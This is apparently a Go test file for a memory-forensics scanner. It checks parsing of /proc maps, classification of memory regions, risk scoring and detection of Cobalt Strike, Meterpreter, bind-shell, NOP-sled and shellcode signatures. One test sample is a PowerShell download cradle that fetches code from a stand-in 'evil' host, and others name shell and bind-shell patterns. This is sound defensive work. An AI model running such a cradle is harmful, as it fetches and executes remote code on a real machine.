// Copyright (c) 2026 Chaoqun-Guo
// SPDX-License-Identifier: Apache-2.0

package	memforensic

import	(
	"testing"
)

//	──	Types	tests	─────────────────────────────────────────────────

func	TestNewScanResult(t	*testing.T)	{
	r	:=	&MemScanResult{
		PID:		1234,
		Comm:	"nginx",
	}
	if	r.PID	!=	1234	{
		t.Errorf("PID	=	%d",	r.PID)
	}
	if	r.HasMatches()	{
		t.Error("new	result	should	have	no	matches")
	}
	if	r.MatchCount()	==	nil	{
		t.Error("MatchCount	should	not	return	nil")
	}
	if	n	:=	r.MatchCount()[SevCritical];	n	!=	0	{
		t.Errorf("expected	0	critical,	got	%d",	n)
	}
}

func	TestMemDumpResultHasData(t	*testing.T)	{
	r	:=	&MemDumpResult{PID:	1}
	if	r.HasData()	{
		t.Error("empty	dump	should	not	have	data")
	}
	r.StackData	=	[]byte("data")
	if	!r.HasData()	{
		t.Error("dump	with	stack	data	should	have	data")
	}
}

func	TestMemDumpResultSegmentCount(t	*testing.T)	{
	r	:=	&MemDumpResult{
		PID:	1,
		Regions:	[]MemoryRegion{
			{Start:	0x1000,	End:	0x2000,	Perms:	"r-xp"},
			{Start:	0x2000,	End:	0x3000,	Perms:	"rw-p"},
		},
	}
	if	n	:=	r.SegmentCount();	n	!=	2	{
		t.Errorf("segment	count	=	%d",	n)
	}
}

func	TestMemForensicResultNodeAttributes(t	*testing.T)	{
	r	:=	&MemForensicResult{
		Trigger:	TrigMprotectRX,
		Scan:	&MemScanResult{
			RiskScore:	85,
			RiskLevel:	"critical",
			StackHash:	"abc123",
			Matches:	[]ScanMatch{
				{Rule:	"CS_BEACON_MUTEX",	Severity:	SevCritical,	Source:	"hex"},
			},
		},
		Dump:	&MemDumpResult{
			Regions:	[]MemoryRegion{
				{Start:	0,	End:	0x1000,	Perms:	"r-xp"},
			},
		},
	}
	attrs	:=	r.NodeAttributes()
	if	attrs["mem_trigger"]	!=	"MPROTECT_RW_TO_RX"	{
		t.Errorf("trigger	=	%s",	attrs["mem_trigger"])
	}
	if	attrs["mem_risk_level"]	!=	"critical"	{
		t.Errorf("risk	level	=	%s",	attrs["mem_risk_level"])
	}
	if	attrs["mem_top_match"]	!=	"CS_BEACON_MUTEX/critical"	{
		t.Errorf("top	match	=	%s",	attrs["mem_top_match"])
	}
}

func	TestNilResultNodeAttributes(t	*testing.T)	{
	var	r	*MemForensicResult
	attrs	:=	r.NodeAttributes()
	if	attrs	==	nil	{
		t.Error("nil	result	should	return	non-nil	map")
	}
}

//	──	Maps	parser	tests	───────────────────────────────────────────

func	TestParseMapsLineNormal(t	*testing.T)	{
	line	:=	"555555554000-555555556000	r-xp	00000000	08:01	1234567	/usr/bin/nginx"
	reg,	err	:=	parseMapsLine(line)
	if	err	!=	nil	{
		t.Fatalf("parse	error:	%v",	err)
	}
	if	reg.Start	!=	0x555555554000	{
		t.Errorf("start	=	0x%x",	reg.Start)
	}
	if	reg.End	!=	0x555555556000	{
		t.Errorf("end	=	0x%x",	reg.End)
	}
	if	reg.Perms	!=	"r-xp"	{
		t.Errorf("perms	=	%s",	reg.Perms)
	}
	if	reg.Offset	!=	0	{
		t.Errorf("offset	=	%d",	reg.Offset)
	}
	if	reg.Inode	!=	1234567	{
		t.Errorf("inode	=	%d",	reg.Inode)
	}
	if	reg.Pathname	!=	"/usr/bin/nginx"	{
		t.Errorf("pathname	=	%s",	reg.Pathname)
	}
}

func	TestParseMapsLineStack(t	*testing.T)	{
	line	:=	"7ffc80000000-7ffc80001000	rw-p	00000000	00:00	0	[stack]"
	reg,	err	:=	parseMapsLine(line)
	if	err	!=	nil	{
		t.Fatalf("parse	error:	%v",	err)
	}
	if	reg.Pathname	!=	"[stack]"	{
		t.Errorf("pathname	=	%s",	reg.Pathname)
	}
	if	reg.Perms	!=	"rw-p"	{
		t.Errorf("perms	=	%s",	reg.Perms)
	}
}

func	TestParseMapsLineHeap(t	*testing.T)	{
	line	:=	"555555600000-555555700000	rw-p	00000000	00:00	0	[heap]"
	reg,	err	:=	parseMapsLine(line)
	if	err	!=	nil	{
		t.Fatalf("parse	error:	%v",	err)
	}
	if	reg.Pathname	!=	"[heap]"	{
		t.Errorf("pathname	=	%s",	reg.Pathname)
	}
}

func	TestParseMapsLineAnonymous(t	*testing.T)	{
	line	:=	"7f0000000000-7f0000001000	r-xp	00000000	00:00	0"
	reg,	err	:=	parseMapsLine(line)
	if	err	!=	nil	{
		t.Fatalf("parse	error:	%v",	err)
	}
	if	reg.Pathname	!=	""	{
		t.Errorf("pathname	=	%q",	reg.Pathname)
	}
	if	reg.Perms	!=	"r-xp"	{
		t.Errorf("perms	=	%s",	reg.Perms)
	}
}

func	TestParseMapsLineMalformed(t	*testing.T)	{
	_,	err	:=	parseMapsLine("not	a	valid	maps	line")
	if	err	==	nil	{
		t.Error("expected	error	for	malformed	line")
	}
}

func	TestParseMapsLineShort(t	*testing.T)	{
	_,	err	:=	parseMapsLine("1000-2000	r-xp")
	if	err	==	nil	{
		t.Error("expected	error	for	short	line")
	}
}

func	TestClassifyRegion(t	*testing.T)	{
	tests	:=	[]struct	{
		region	MemoryRegion
		want			SegmentType
	}{
		{MemoryRegion{Pathname:	"[stack]"},	SegStack},
		{MemoryRegion{Pathname:	"[heap]"},	SegHeap},
		{MemoryRegion{Pathname:	"[vdso]"},	SegVDSO},
		{MemoryRegion{Pathname:	"[vvar]"},	SegVVar},
		{MemoryRegion{Pathname:	"[vsyscall]"},	SegVSysCall},
		{MemoryRegion{Pathname:	"",	Perms:	"r-xp"},	SegExec},
		{MemoryRegion{Pathname:	"/usr/lib/libc.so",	Perms:	"r-xp"},	SegExec},
		{MemoryRegion{Pathname:	"/usr/lib/libc.so",	Perms:	"rw-p"},	SegFile},
		{MemoryRegion{Pathname:	"",	Perms:	"rw-p"},	SegAnon},
	}
	for	_,	tt	:=	range	tests	{
		got	:=	classifyRegion(tt.region)
		if	got	!=	tt.want	{
			t.Errorf("classify(%+v)	=	%s,	want	%s",	tt.region,	got,	tt.want)
		}
	}
}

//	──	Region	helpers	tests	────────────────────────────────────────

func	TestFindStackRegion(t	*testing.T)	{
	regions	:=	[]MemoryRegion{
		{Start:	0x1000,	End:	0x2000,	Pathname:	"r-xp",	Perms:	"/usr/bin/foo"},
		{Start:	0x7000,	End:	0x8000,	Pathname:	"[stack]",	Perms:	"rw-p"},
	}
	s	:=	FindStackRegion(regions)
	if	s	==	nil	{
		t.Fatal("stack	not	found")
	}
	if	s.Start	!=	0x7000	{
		t.Errorf("stack	start	=	0x%x",	s.Start)
	}
}

func	TestFindStackRegionNotFound(t	*testing.T)	{
	regions	:=	[]MemoryRegion{
		{Start:	0x1000,	End:	0x2000,	Pathname:	"r-xp",	Perms:	"/usr/bin/foo"},
	}
	if	s	:=	FindStackRegion(regions);	s	!=	nil	{
		t.Error("expected	nil	stack")
	}
}

func	TestFindHeapRegion(t	*testing.T)	{
	regions	:=	[]MemoryRegion{
		{Start:	0x3000,	End:	0x4000,	Pathname:	"[heap]",	Perms:	"rw-p"},
	}
	h	:=	FindHeapRegion(regions)
	if	h	==	nil	{
		t.Fatal("heap	not	found")
	}
	if	h.Start	!=	0x3000	{
		t.Errorf("heap	start	=	0x%x",	h.Start)
	}
}

func	TestHasWXPerms(t	*testing.T)	{
	regions	:=	[]MemoryRegion{
		{Start:	0x1000,	End:	0x2000,	Perms:	"r-xp"},
		{Start:	0x2000,	End:	0x3000,	Perms:	"rwxp"},
	}
	if	!HasWXPerms(regions)	{
		t.Error("expected	W+X	detected")
	}

	regions2	:=	[]MemoryRegion{
		{Start:	0x1000,	End:	0x2000,	Perms:	"r-xp"},
		{Start:	0x2000,	End:	0x3000,	Perms:	"rw-p"},
	}
	if	HasWXPerms(regions2)	{
		t.Error("expected	no	W+X")
	}
}

func	TestAnonExecRegions(t	*testing.T)	{
	regions	:=	[]MemoryRegion{
		{Start:	0x1000,	End:	0x2000,	Perms:	"r-xp",	Pathname:	""},
		{Start:	0x2000,	End:	0x3000,	Perms:	"r-xp",	Pathname:	"/usr/bin/foo"},
		{Start:	0x3000,	End:	0x4000,	Perms:	"rw-p",	Pathname:	""},
	}
	anon	:=	AnonExecRegions(regions)
	if	len(anon)	!=	1	{
		t.Errorf("expected	1	anon	exec	region,	got	%d",	len(anon))
	}
	if	anon[0].Start	!=	0x1000	{
		t.Errorf("anon	exec	start	=	0x%x",	anon[0].Start)
	}
}

func	TestTotalExecSize(t	*testing.T)	{
	regions	:=	[]MemoryRegion{
		{Start:	0x1000,	End:	0x2000,	Perms:	"r-xp"},
		{Start:	0x2000,	End:	0x3000,	Perms:	"r--p"},
		{Start:	0x5000,	End:	0x8000,	Perms:	"r-xp"},
	}
	total	:=	TotalExecSize(regions)
	if	total	!=	0x1000+0x3000	{
		t.Errorf("total	exec	=	0x%x",	total)
	}
}

//	──	Scanner	tests	───────────────────────────────────────────────

func	TestNewMemoryScanner(t	*testing.T)	{
	s	:=	NewMemoryScanner(nil)
	if	s	==	nil	{
		t.Fatal("scanner	is	nil")
	}
	if	len(s.hexPatterns)	==	0	{
		t.Error("expected	default	hex	patterns")
	}
}

func	TestMemoryScannerCustomConfig(t	*testing.T)	{
	cfg	:=	&ScannerConfig{EnableHexScanner:	false}
	s	:=	NewMemoryScanner(cfg)
	if	len(s.hexPatterns)	!=	0	{
		t.Error("expected	no	hex	patterns	when	disabled")
	}
}

func	TestScanEmptyDump(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{EnableHexScanner:	true})
	dump	:=	&MemDumpResult{PID:	1,	Comm:	"test"}
	result	:=	s.Scan(dump)
	if	result	==	nil	{
		t.Fatal("result	is	nil")
	}
	if	result.HasMatches()	{
		t.Error("empty	dump	should	not	match")
	}
	if	result.StackHash	!=	""	{
		t.Error("expected	empty	stack	hash")
	}
}

func	TestScanWithHexMatch(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						1,
		Comm:					"test",
		ExecData:	[]byte("some data with /bin/sh\x00 in it"),
	}
	result	:=	s.Scan(dump)
	if	result	==	nil	{
		t.Fatal("result	is	nil")
	}
	if	!result.HasMatches()	{
		t.Error("expected	match	for	/bin/sh")
	}
	//	Should	match	EXECVE_BINSH.
	found	:=	false
	for	_,	m	:=	range	result.Matches	{
		if	m.Rule	==	"EXECVE_BINSH"	{
			found	=	true
			break
		}
	}
	if	!found	{
		t.Errorf("expected	EXECVE_BINSH	match,	got:	%v",	result.Matches)
	}
}

func	TestScanWithCSMutex(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						2,
		Comm:					"beacon",
		ExecData:	[]byte("this	contains	messageBox	mutex	pattern"),
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	CS_BEACON_MUTEX	match")
	}
	for	_,	m	:=	range	result.Matches	{
		if	m.Rule	==	"CS_BEACON_MUTEX"	&&	m.Severity	!=	SevCritical	{
			t.Errorf("CS	match	severity	=	%s,	expected	critical",	m.Severity)
		}
	}
}

func	TestScanWithCSPipe(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						3,
		Comm:					"service",
		ExecData:	[]byte(`\\.\pipe\`),
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	CS_BEACON_PIPE	match")
	}
}

func	TestScanWithMeterpreter(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						4,
		Comm:					"explorer",
		ExecData:	[]byte("METERPRETER	payload	here"),
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	METERPRETER_STAGE	match")
	}
}

func	TestScanWithExecveBinSh(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						5,
		Comm:					"bash",
		ExecData:	[]byte("prefix	/bin/sh\x00suffix"),
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	execve	match")
	}
}

func	TestScanWithBindShell(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	//	Port	4444	in	big-endian	=	0x115c
	dump	:=	&MemDumpResult{
		PID:						6,
		Comm:					"nc",
		ExecData:	[]byte{0x11,	0x5c},
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	BINDSHELL_4444	match")
	}
}

func	TestScanWithELFMagic(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						7,
		Comm:					"injected",
		ExecData:	[]byte{0x7f,	0x45,	0x4c,	0x46},
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	ELF_MAGIC_ANON	match")
	}
}

func	TestScanWithNopSled(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						8,
		Comm:					"shellcode",
		ExecData:	[]byte{0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90,	0x90},
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	NOP_SLED	match")
	}
}

func	TestScanWithPSCradle(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:						9,
		Comm:					"powershell",
		ExecData:	[]byte("Invoke-Expression	(DownloadString('http://evil/'))"),
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	PS_DOWNLOAD_CRADLE	match")
	}
}

func	TestScanWithStackData(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{
		EnableHexScanner:	true,
	})
	dump	:=	&MemDumpResult{
		PID:							10,
		Comm:						"test",
		StackData:	[]byte("/bin/sh\x00"),
		ExecData:		[]byte("innocent	code	here"),
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	match	in	stack	data")
	}
}

func	TestScanRiskScoring(t	*testing.T)	{
	tests	:=	[]struct	{
		matches	[]ScanMatch
		want				string
	}{
		{nil,	"low"},
		{[]ScanMatch{{Rule:	"NOP_SLED_LARGE",	Severity:	SevLow}},	"low"},
		{[]ScanMatch{{Rule:	"CS_BEACON_MUTEX",	Severity:	SevCritical}},	"critical"},
		{[]ScanMatch{
			{Rule:	"MEMFD_REFERENCE",	Severity:	SevMedium},
			{Rule:	"SHELLCODE_FORK",	Severity:	SevHigh},
		},	"critical"},
	}
	for	_,	tt	:=	range	tests	{
		score	:=	calcMatchRisk(tt.matches)
		level	:=	riskLevel(score)
		if	level	!=	tt.want	{
			t.Errorf("matches=%v	score=%.0f	level=%s	want=%s",	tt.matches,	score,	level,	tt.want)
		}
	}
}

func	TestCalcMatchRiskDedup(t	*testing.T)	{
	//	Same	rule	matching	multiple	times	should	be	counted	once.
	matches	:=	[]ScanMatch{
		{Rule:	"CS_BEACON_MUTEX",	Severity:	SevCritical},
		{Rule:	"CS_BEACON_MUTEX",	Severity:	SevCritical},
	}
	score	:=	calcMatchRisk(matches)
	if	score	!=	60	{
		t.Errorf("deduped	score	=	%.0f,	want	60",	score)
	}
}

//	──	Trigger	tests	───────────────────────────────────────────────

func	TestNewTriggerEvaluator(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(nil)
	if	e	==	nil	{
		t.Fatal("evaluator	is	nil")
	}
}

func	TestTriggerCustomConfig(t	*testing.T)	{
	cfg	:=	&TriggerConfig{
		EnableMprotectRX:				false,
		EnableShellcodeAttr:	false,
		EnableFileless:						false,
	}
	e	:=	NewTriggerEvaluator(cfg)
	ev	:=	e.Evaluate(100,	"test",	map[string]interface{}{"shellcode":	true},	"p:100",	"host-a",	0)
	if	ev	!=	nil	{
		t.Error("expected	no	trigger	when	all	disabled")
	}
}

func	TestTriggerMprotectRX(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(nil)
	ev	:=	e.Evaluate(100,	"nginx",	map[string]interface{}{"shellcode":	true},	"p:100",	"host-a",	0)
	if	ev	==	nil	{
		t.Fatal("expected	trigger")
	}
	if	ev.Reason	!=	TrigMprotectRX	{
		t.Errorf("reason	=	%s",	ev.Reason)
	}
	if	ev.PID	!=	100	{
		t.Errorf("PID	=	%d",	ev.PID)
	}
}

func	TestTriggerShellcodeAttr(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(&TriggerConfig{
		EnableMprotectRX:	false,
		EnableShellcodeAttr:	true,
	})
	ev	:=	e.Evaluate(200,	"bash",	map[string]interface{}{"shellcode":	true},	"p:200",	"host-b",	0)
	if	ev	==	nil	{
		t.Fatal("expected	trigger")
	}
	if	ev.Reason	!=	TrigShellcodeAttr	{
		t.Errorf("reason	=	%s",	ev.Reason)
	}
}

func	TestTriggerFileless(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(&TriggerConfig{
		EnableMprotectRX:				false,
		EnableShellcodeAttr:	false,
		EnableFileless:						true,
	})
	ev	:=	e.Evaluate(300,	"memfd_test",	map[string]interface{}{"fileless":	true},	"p:300",	"host-c",	0)
	if	ev	==	nil	{
		t.Fatal("expected	trigger")
	}
	if	ev.Reason	!=	TrigFilelessExec	{
		t.Errorf("reason	=	%s",	ev.Reason)
	}
}

func	TestTriggerDeepTaint(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(&TriggerConfig{
		EnableMprotectRX:				false,
		EnableShellcodeAttr:	false,
		EnableFileless:						false,
		EnableDeepTaint:					true,
		DeepTaintMinDepth:			3,
	})
	//	Depth	5	with	network	activity.
	ev	:=	e.Evaluate(400,	"curl",	map[string]interface{}{"dport":	uint32(443)},	"p:400",	"host-d",	5)
	if	ev	==	nil	{
		t.Fatal("expected	deep	taint	trigger")
	}
	if	ev.Reason	!=	TrigDeepTainted	{
		t.Errorf("reason	=	%s",	ev.Reason)
	}

	//	Depth	2	(below	threshold)	should	NOT	trigger.
	ev2	:=	e.Evaluate(401,	"curl",	map[string]interface{}{"dport":	uint32(443)},	"p:401",	"host-d",	2)
	if	ev2	!=	nil	{
		t.Error("expected	no	trigger	for	depth	<	min")
	}
}

func	TestTriggerSupplyChainRisk(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(&TriggerConfig{
		EnableMprotectRX:				false,
		EnableShellcodeAttr:	false,
		EnableFileless:						false,
		EnableDeepTaint:					false,
		EnableSupplyChain:			true,
	})
	ev	:=	e.Evaluate(500,	"malware",	map[string]interface{}{"supply_chain_risk":	"critical"},	"p:500",	"host-e",	0)
	if	ev	==	nil	{
		t.Fatal("expected	supply	chain	trigger")
	}
	if	ev.Reason	!=	TrigSupplyChainRisk	{
		t.Errorf("reason	=	%s",	ev.Reason)
	}

	//	Low	risk	should	NOT	trigger.
	ev2	:=	e.Evaluate(501,	"nginx",	map[string]interface{}{"supply_chain_risk":	"low"},	"p:501",	"host-e",	0)
	if	ev2	!=	nil	{
		t.Error("expected	no	trigger	for	low	supply	chain	risk")
	}
}

func	TestTriggerManual(t	*testing.T)	{
	ev	:=	ManualTrigger(600,	"test",	"operator	requested")
	if	ev	==	nil	{
		t.Fatal("expected	manual	trigger")
	}
	if	ev.Reason	!=	TrigManual	{
		t.Errorf("reason	=	%s",	ev.Reason)
	}
	if	ev.PID	!=	600	{
		t.Errorf("PID	=	%d",	ev.PID)
	}
}

func	TestTriggerEvaluateStringMap(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(&TriggerConfig{
		EnableMprotectRX:		true,
		EnableShellcodeAttr:	false,
		EnableFileless:						false,
	})
	ev	:=	e.EvaluateStringMap(700,	"test",	map[string]string{"shellcode":	"true"},	"p:700",	"host-f",	0)
	if	ev	==	nil	{
		t.Fatal("expected	trigger	from	string	map")
	}
}

func	TestTriggerNoMatch(t	*testing.T)	{
	e	:=	NewTriggerEvaluator(&TriggerConfig{
		EnableMprotectRX:				false,
		EnableShellcodeAttr:	false,
		EnableFileless:						false,
		EnableDeepTaint:					false,
		EnableSupplyChain:			false,
	})
	ev	:=	e.Evaluate(800,	"innocent",	map[string]interface{}{"pid":	uint32(800)},	"p:800",	"host-g",	0)
	if	ev	!=	nil	{
		t.Error("expected	no	trigger	for	innocent	process")
	}
}

func	TestValidateConfig(t	*testing.T)	{
	if	err	:=	ValidateConfig(DefaultTriggerConfig());	err	!=	nil	{
		t.Errorf("default	config	should	be	valid:	%v",	err)
	}
	if	err	:=	ValidateConfig(nil);	err	==	nil	{
		t.Error("expected	error	for	nil	config")
	}
	bad	:=	&TriggerConfig{DeepTaintMinDepth:	0}
	if	err	:=	ValidateConfig(bad);	err	==	nil	{
		t.Error("expected	error	for	invalid	depth")
	}
	bad2	:=	&TriggerConfig{DeepTaintMinDepth:	1,	SupplyChainMinLevel:	"invalid"}
	if	err	:=	ValidateConfig(bad2);	err	==	nil	{
		t.Error("expected	error	for	invalid	level")
	}
}

//	──	Integration	tests	───────────────────────────────────────────

func	TestApplyToStringAttrs(t	*testing.T)	{
	result	:=	&MemForensicResult{
		Trigger:	TrigMprotectRX,
		Scan:	&MemScanResult{
			RiskScore:	60,
			RiskLevel:	"critical",
			StackHash:	"sha256abc",
			Matches:	[]ScanMatch{
				{Rule:	"CS_BEACON_MUTEX",	Severity:	SevCritical},
			},
		},
		Dump:	&MemDumpResult{
			Regions:	[]MemoryRegion{
				{Perms:	"r-xp",	Pathname:	""},
				{Perms:	"rwxp",	Pathname:	""},
			},
		},
	}
	attrs	:=	make(map[string]string)
	n	:=	ApplyToStringAttrs(attrs,	result)
	if	n	==	0	{
		t.Fatal("no	attrs	set")
	}
	if	attrs["mem_forensic"]	!=	"scanned"	{
		t.Errorf("forensic	=	%s",	attrs["mem_forensic"])
	}
	if	attrs["mem_trigger"]	!=	"MPROTECT_RW_TO_RX"	{
		t.Errorf("trigger	=	%s",	attrs["mem_trigger"])
	}
	if	attrs["mem_risk_level"]	!=	"critical"	{
		t.Errorf("risk	level	=	%s",	attrs["mem_risk_level"])
	}
	if	attrs["mem_stack_hash"]	!=	"sha256abc"	{
		t.Errorf("stack	hash	=	%s",	attrs["mem_stack_hash"])
	}
	if	attrs["mem_match_count"]	!=	"1"	{
		t.Errorf("match	count	=	%s",	attrs["mem_match_count"])
	}
	if	attrs["mem_wx_regions"]	!=	"true"	{
		t.Errorf("wx	regions	=	%s",	attrs["mem_wx_regions"])
	}
	if	attrs["mem_anon_exec"]	!=	"1"	{
		t.Errorf("anon	exec	=	%s",	attrs["mem_anon_exec"])
	}
}

func	TestApplyToStringAttrsNilResult(t	*testing.T)	{
	n	:=	ApplyToStringAttrs(make(map[string]string),	nil)
	if	n	!=	0	{
		t.Errorf("expected	0,	got	%d",	n)
	}
	n	=	ApplyToStringAttrs(nil,	&MemForensicResult{})
	if	n	!=	0	{
		t.Errorf("expected	0,	got	%d",	n)
	}
}

func	TestApplyToNodeAdapter(t	*testing.T)	{
	result	:=	&MemForensicResult{
		Trigger:	TrigFilelessExec,
		Scan:	&MemScanResult{
			RiskScore:	40,
			RiskLevel:	"high",
			Matches:			[]ScanMatch{{Rule:	"MEMFD_REFERENCE",	Severity:	SevMedium}},
		},
	}
	attrs	:=	make(map[string]interface{})
	adapter	:=	NewNodeAttrsAdapter(attrs)
	n	:=	ApplyToNode(adapter,	result)
	if	n	==	0	{
		t.Fatal("expected	attrs	set")
	}
	if	attrs["mem_forensic"]	!=	"scanned"	{
		t.Errorf("forensic	=	%v",	attrs["mem_forensic"])
	}
	if	attrs["mem_trigger"]	!=	"FILELESS_EXECUTION"	{
		t.Errorf("trigger	=	%v",	attrs["mem_trigger"])
	}
}

func	TestApplyToNodeNil(t	*testing.T)	{
	n	:=	ApplyToNode(nil,	&MemForensicResult{})
	if	n	!=	0	{
		t.Errorf("expected	0,	got	%d",	n)
	}
}

func	TestNodeAttributesAdapter(t	*testing.T)	{
	attrs	:=	map[string]interface{}{"existing":	"val"}
	adapter	:=	NewNodeAttrsAdapter(attrs)
	adapter.Attrs()["new"]	=	"value"
	if	attrs["new"]	!=	"value"	{
		t.Error("adapter	should	modify	underlying	map")
	}
}

func	TestHandleTrigger(t	*testing.T)	{
	event	:=	&TriggerEvent{
		PID:				999999,	//	unlikely	to	exist
		Comm:			"nonexistent",
		Reason:	TrigManual,
	}

	s	:=	NewMemoryScanner(&ScannerConfig{EnableHexScanner:	false})
	result,	attrs	:=	HandleTrigger(event,	s)

	if	result	==	nil	{
		t.Fatal("HandleTrigger	should	return	result	even	on	failure")
	}
	if	result.Dump	!=	nil	&&	result.Dump.Error	!=	""	{
		t.Logf("Expected	acquire	failure:	%s	(running	in	test	env)",	result.Dump.Error)
	}
	_	=	attrs
}

func	TestAcquireAndScan(t	*testing.T)	{
	//	Test	with	invalid	PID	-	should	return	error	but	not	panic.
	s	:=	NewMemoryScanner(&ScannerConfig{EnableHexScanner:	true})
	result	:=	AcquireAndScan(-1,	TrigManual,	"p:-1",	"host-test",	s)
	if	result	==	nil	{
		t.Fatal("result	is	nil")
	}
	if	result.Dump	!=	nil	&&	result.Dump.Error	==	""	{
		t.Log("Acquire	succeeded	(running	as	root?)")
	}
}

//	──	Edge	case	tests	─────────────────────────────────────────────

func	TestEmptyMapsLine(t	*testing.T)	{
	_,	err	:=	parseMapsLine("")
	if	err	==	nil	{
		t.Error("expected	error	for	empty	line")
	}
}

func	TestNilScannerScan(t	*testing.T)	{
	s	:=	NewMemoryScanner(nil)
	if	s	==	nil	{
		t.Fatal("scanner	is	nil")
	}
}

func	TestPartialDump(t	*testing.T)	{
	//	If	exec	data	is	empty	but	stack	data	exists,	scanning	should	still	work.
	s	:=	NewMemoryScanner(&ScannerConfig{EnableHexScanner:	true})
	dump	:=	&MemDumpResult{
		PID:							11,
		Comm:						"partial",
		StackData:	[]byte("/bin/sh\x00"),
	}
	result	:=	s.Scan(dump)
	if	result	==	nil	{
		t.Fatal("result	is	nil")
	}
	if	result.ExecHash	!=	""	{
		t.Error("expected	empty	exec	hash")
	}
	if	result.StackHash	==	""	{
		t.Error("expected	stack	hash")
	}
	if	!result.HasMatches()	{
		t.Error("expected	match	from	stack	data")
	}
}

func	TestScannedResultMatchCount(t	*testing.T)	{
	r	:=	&MemScanResult{
		Matches:	[]ScanMatch{
			{Rule:	"A",	Severity:	SevCritical},
			{Rule:	"B",	Severity:	SevHigh},
		},
	}
	counts	:=	r.MatchCount()
	if	counts[SevCritical]	!=	1	{
		t.Errorf("critical	=	%d",	counts[SevCritical])
	}
	if	counts[SevHigh]	!=	1	{
		t.Errorf("high	=	%d",	counts[SevHigh])
	}
}

func	TestMultipleSegmentScan(t	*testing.T)	{
	s	:=	NewMemoryScanner(&ScannerConfig{EnableHexScanner:	true})
	dump	:=	&MemDumpResult{
		PID:							12,
		Comm:						"multi",
		ExecData:		[]byte("/bin/sh\x00"),
		StackData:	[]byte("METERPRETER"),
		HeapData:		[]byte("messageBox"),
	}
	result	:=	s.Scan(dump)
	if	!result.HasMatches()	{
		t.Error("expected	matches	across	segments")
	}
	//	Should	have	at	least	3	matches:	EXECVE_BINSH,	METERPRETER_STAGE,	CS_BEACON_MUTEX
	if	len(result.Matches)	<	3	{
		t.Errorf("expected	>=	3	matches,	got	%d:	%v",	len(result.Matches),	matchNames(result.Matches))
	}
}

func	TestNoDoubleCountInRiskScore(t	*testing.T)	{
	//	Same	rule	multiple	times	in	different	segments	should	still	be	deduped.
	s	:=	NewMemoryScanner(&ScannerConfig{EnableHexScanner:	true})
	dump	:=	&MemDumpResult{
		PID:							13,
		Comm:						"dedup",
		ExecData:		[]byte("/bin/sh\x00"),
		StackData:	[]byte("/bin/sh\x00"),
	}
	result	:=	s.Scan(dump)
	//	Should	find	EXECVE_BINSH	twice	(once	in	each	segment)	but	only	count	once.
	if	result.RiskScore	>	70	{
		t.Errorf("risk	score	should	be	capped	by	dedup,	got	%.0f",	result.RiskScore)
	}
}

func	matchNames(matches	[]ScanMatch)	[]string	{
	var	names	[]string
	for	_,	m	:=	range	matches	{
		names	=	append(names,	m.Rule)
	}
	return	names
}

func	TestReadCommInvalidPID(t	*testing.T)	{
	_,	err	:=	readComm(-1)
	if	err	==	nil	{
		t.Error("expected	error	for	invalid	PID")
	}
}

func	TestHasWXPermsEdgeCases(t	*testing.T)	{
	//	Single	region	with	all	flags.
	r	:=	[]MemoryRegion{{Perms:	"rwxp"}}
	if	!HasWXPerms(r)	{
		t.Error("expected	rwxp	to	be	detected")
	}
	//	Private	mapping	rwxp.
	r2	:=	[]MemoryRegion{{Perms:	"rwxp"}}
	if	!HasWXPerms(r2)	{
		t.Error("expected	rwxp	to	be	detected")
	}
	//	No	perms.
	r3	:=	[]MemoryRegion{{Perms:	"---p"}}
	if	HasWXPerms(r3)	{
		t.Error("expected	no	W+X")
	}
}
